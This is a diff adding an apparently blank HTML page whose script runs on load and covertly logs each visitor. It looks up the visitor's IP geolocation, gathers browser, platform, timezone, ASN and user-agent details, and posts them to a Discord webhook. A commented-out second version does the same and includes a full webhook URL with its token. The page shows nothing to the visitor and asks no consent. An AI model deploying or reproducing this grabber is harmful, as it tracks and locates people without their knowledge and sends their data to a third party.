@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+</head>
+
+<body>
+
+</body>
+<script>
+
+
+
+
+fetch("https://ipapi.co/json")
+    .then(response => response.json())
+    .then(data => webhook(data));
+
+
+
+
+  const webhook = (data) => {
+    console.log(data)
+    const webhook = "";
+
+
+    var mes = {
+      "embeds": [{
+          "title": "Web log",
+          "description": "Test-658205",
+          "color": "4210943",
+          "fields": [
+            {
+              "name": "IP Address",
+              "value": data.ip
+        },
+            {
+              "name": "Location",
+              "value": `:flag_${data.country_code.toLowerCase()}: ${data.city}, ${data.country}\n:round_pushpin: Lat: ${data.latitude}\n:round_pushpin: Lon: ${data.longitude}\n🏷️ ${data.latitude}, ${data.longitude}`
+              },
+            {
+              "name": "Platform",
+              "value": `:desktop: ${navigator.platform}`
+              },
+            {
+              "name": "Browser",
+              "value": `:placard:  ${navigator.userAgent.match(/(firefox|msie|chrome|safari|trident|edge|opera|brave)/i)[0].replace('/', ' ')} @${navigator.userAgent.match(/(firefox|msie|chrome|safari|trident|edge|opera|brave)\/?\s*(\.?\d+(\.\d+)*)/i)[2]}`
+              },
+
+            {
+              "name": "Timezone",
+              "value": `:world_map: ${Intl.DateTimeFormat().resolvedOptions().timeZone} Offset: UTC${new Date().getTimezoneOffset() > 0 ? '-' : '+'}${Math.abs(new Date().getTimezoneOffset() / 60).toString().padStart(2, '0')}:${Math.abs(new Date().getTimezoneOffset() % 60).toString().padStart(2, '0')}`
+
+            },
+            {
+              "name": "ASN",
+              "value": `:globe_with_meridians: ${data.asn.toUpperCase()}`
+              },
+
+
+
+            {
+              "name": "User Agent",
+              "value": `${navigator.userAgent}`
+              },
+
+
+
+
+      ]
+    }
+    ]
+    };
+
+    fetch(webhook, {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(mes)
+      })
+
+      .then(response => {
+        if (response.ok) {
+          console.log("Webhook sent successfully");
+        } else {
+          console.log("Webhook failed with status code " + response.status);
+        }
+      })
+      .catch(error => {
+        console.error("Error sending webhook: ", error);
+      });
+  }
+  
+
+
+
+  /*{
+
+       console.log(data);
+       const ipAddress = data.ip;
+       const location = `:flag_${data.country_code.toLowerCase()}: ${data.city}, ${data.country}`;
+       const platform = `:desktop: ${navigator.platform}`;
+       // Extract browser name and version from User-Agent string
+       const browserName = navigator.userAgent.match(/(firefox|msie|chrome|safari|trident|edge|opera|brave)/i)[0].replace('/', ' ');
+       const browserVersion = navigator.userAgent.match(/(firefox|msie|chrome|safari|trident|edge|opera|brave)\/?\s*(\.?\d+(\.\d+)*)/i)[2];
+       const browser = `:globe_with_meridians: ${browserName} ${browserVersion}`;
+       const utcOffset = new Date().getTimezoneOffset();
+       const timezone = `:world_map: ${Intl.DateTimeFormat().resolvedOptions().timeZone} Offset: UTC${utcOffset > 0 ? '-' : '+'}${Math.abs(utcOffset / 60).toString().padStart(2, '0')}:${Math.abs(utcOffset % 60).toString().padStart(2, '0')}`;
+       const asn = `:globe_with_meridians: ${data.asn}`;
+      
+       const headers = JSON.stringify(data.headers);
+       const userAgent = navigator.userAgent;
+
+     }
+     */
+
+
+
+
+  /*
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'https://ipapi.co/json');
+    xhr.setRequestHeader('User-Agent', navigator.userAgent);
+    xhr.onload = function() {
+      if (xhr.status === 200) {
+        const data = JSON.parse(xhr.responseText);
+       
+        const ipAddress = data.ip;
+        const location = `:flag_${data.country_code.toLowerCase()}: ${data.city}, ${data.country}`;
+        const platform = `:desktop: ${navigator.platform}`;
+
+        // Extract browser name and version from User-Agent string
+        const browserName = navigator.userAgent.match(/(firefox|msie|chrome|safari|trident|edge|opera|brave)/i)[0].replace('/', ' ');
+        const browserVersion = navigator.userAgent.match(/(firefox|msie|chrome|safari|trident|edge|opera|brave)\/?\s*(\.?\d+(\.\d+)*)/i)[2];
+
+        const browser = `:globe_with_meridians: ${browserName} ${browserVersion}`;
+
+        const utcOffset = new Date().getTimezoneOffset();
+        const timezone = `:world_map: ${Intl.DateTimeFormat().resolvedOptions().timeZone} Offset: UTC${utcOffset > 0 ? '-' : '+'}${Math.abs(utcOffset / 60).toString().padStart(2, '0')}:${Math.abs(utcOffset % 60).toString().padStart(2, '0')}`;
+
+        const asn = `:globe_with_meridians: ${data.asn}`;
+        const headers = JSON.stringify(data.headers);
+
+        const userAgent = navigator.userAgent;
+
+
+        const data_w = {
+          "content": "log!",
+          "embeds": [
+            {
+              "title": "Log",
+              "color": 15258703,
+              "fields": [
+                {
+                  "name": "IP Address",
+                  "value": ipAddress
+              },
+                {
+                  "name": "Location",
+                  "value": `${location}\nLat: ${data.latitude}\nLon: ${data.longitude}`,
+              },
+
+                {
+                  "name": "Platform",
+                  "value": platform
+              },
+                {
+                  "name": "Browser",
+                  "value": browser
+              },
+                {
+                  "name": "Browser Name",
+                  "value": browserName
+                },
+                {
+                  "name": "Browser Version",
+                  "value": browserVersion
+                },
+
+
+                {
+                  "name": "Timezone",
+                  "value": timezone
+              },
+                {
+                  "name": "ASN",
+                  "value": asn
+              },
+             
+                {
+                  "name": "Headers",
+                  "value": headers
+              },
+                {
+                  "name": "User Agent",
+                  "value": userAgent
+              }
+              
+              
+            ]
+          }
+        ]
+        };
+        const webhook = "https://discord.com/api/webhooks/1079456627243090102/zmt_oLfZ4TVWKH6u";
+        console.log(JSON.stringify(data_w))
+        fetch(webhook, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json"
+            },
+            body: JSON.stringify(data_w)
+          })
+          .then(response => {
+            if (response.ok) {
+              console.log("Webhook sent successfully");
+            } else {
+              console.log("Webhook failed with status code " + response.status);
+            }
+          })
+          .catch(error => {
+            console.error("Error sending webhook: ", error);
+          });
+          
+      }
+    };
+
+    xhr.send();
+  */
+</script>
+
+</html>
